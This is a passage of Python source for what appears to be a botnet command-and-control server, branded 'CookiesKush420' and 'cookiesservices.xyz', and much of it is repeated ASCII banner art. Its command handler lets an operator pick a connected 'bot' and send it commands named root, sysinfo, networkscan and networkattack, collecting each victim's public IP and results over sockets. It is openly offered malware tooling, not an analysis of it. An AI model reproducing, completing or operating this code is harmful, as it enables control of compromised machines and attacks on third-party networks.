                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
						print(self.main_logo)
						self._take_cmd()

			elif cmd == "root":
				self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
				print(self.main_logo)
				self.list_clients()
				
				bot = int(input(f"\n\t{RESET}Select bot {RED}: {RESET}"))

				if bot > len(self.all_address) - 1:
					print(RED + "\n\tInvalid Bot Number" + RESET)
					sleep(2)
					clear()
					self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
					print(self.main_logo)
					self._take_cmd()

				else: 
					try:
						self.all_connections[bot].send("getip".encode())
						public_ip = self.all_connections[bot].recv(1024*5).decode("ascii")
					except BrokenPipeError:
						del self.all_address[bot]
						del self.all_connections[bot]
						
					self._root(bot, public_ip)

			elif cmd == "sysinfo":
				self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
				print(self.main_logo)
				self.list_clients()
				
				bot = int(input(f"\n\t{RESET}Select bot {RED}: {RESET}"))

				if bot > len(self.all_address) - 1:
					print(RED + "\n\tInvalid Bot Number" + RESET)
					sleep(2)
					clear()
					self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
					print(self.main_logo)
					self._take_cmd()

				else: 
					for i, (ip, port) in enumerate(self.all_address): 
						if i == bot:
							try:
								self.all_connections[i].send(cmd.encode())	
								print(Fore.GREEN+f'\n\n{self.all_connections[i].recv(1024*5).decode("ascii")}')
							except BrokenPipeError:
								del self.all_address[i]
								del self.all_connections[i]

			elif cmd == "networkscan":
				self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
				print(self.main_logo)
				self.list_clients()
				
				bot = int(input(f"\n\t{RESET}Select bot {RED}: {RESET}"))

				if bot > len(self.all_address) - 1:
					print(RED + "\n\tInvalid Bot Number" + RESET)
					sleep(2)
					clear()
					self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
					print(self.main_logo)
					self._take_cmd()

				else: 
					for i, (ip, port) in enumerate(self.all_address): 
						if i == bot:
							try:
								self.all_connections[i].send(cmd.encode())	
								print(Fore.GREEN + f'\n\n{self.all_connections[i].recv(1024*5).decode("ascii")}')
							except BrokenPipeError:
								del self.all_address[i]
								del self.all_connections[i]

			elif cmd == "networkattack":
				self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
				print(self.main_logo)
				self.list_clients()
				
				bot = int(input(f"\n\t{RESET}Select bot {RED}: {RESET}"))

				if bot > len(self.all_address) - 1:
					print(RED + "\n\tInvalid Bot Number" + RESET)
					sleep(2)
					clear()
					self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
					print(self.main_logo)
					self._take_cmd()

				else: 
					print(f"\n\n\t{YELLOW}Starting Attack, please wait . . .{RESET}")
					for i, (ip, port) in enumerate(self.all_address): 
						if i == bot:
							try:
								self.all_connections[i].send(cmd.encode())	
								print(Fore.RESET + f'\n\n\t{self.all_connections[i].recv(1024*5).decode("ascii")}\n')
							except BrokenPipeError:
								del self.all_address[i]
								del self.all_connections[i]

			else:
				self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
				print(self.main_logo)
				print(Colorate.Vertical(Colors.red, f"\n\tError: {cmd} is not a valid command", 1))
				self._take_cmd()

	def start(self):
		self.main_logo = f"""
{self.COLOR_BORDER}

                                              __     ______     ______    
                                             /\ \   /\  ___\   /\  __ \   
                                             \ \ \  \ \___  \  \ \ \/\ \  
                                              \ \_\  \/\_____\  \ \_____\ 
                                               \/_/   \/_____/   \/_____/ 

                                   {dll}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u2557
                                   {sdl}   {self.COLOR_MAIN}CookiesKush420#9599 {self.COLOR_BORDER}{sdl} {self.COLOR_MAIN}cookiesservices.xyz   {self.COLOR_BORDER}{sdl}
                                   {sdl}          {self.COLOR_MAIN}Type [{WHITE}help{self.COLOR_MAIN}] to view commands         {self.COLOR_BORDER}{sdl}
                                   {drl}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}{sal}\u255D

{RESET}                 
"""
		print(self.main_logo)

		if self._bind(self.connect):
			Thread(target=self.worker).start()
			while True:
				try:
					self._take_cmd()
				except Exception as e:
					clear()
					print(self.main_logo)
					print(f"Error: {e}")
					input("Press Enter to continue...")


if __name__ == '__main__': 
	try: requests.get('https://google.com')
	except: os._exit(1)

	Server().start()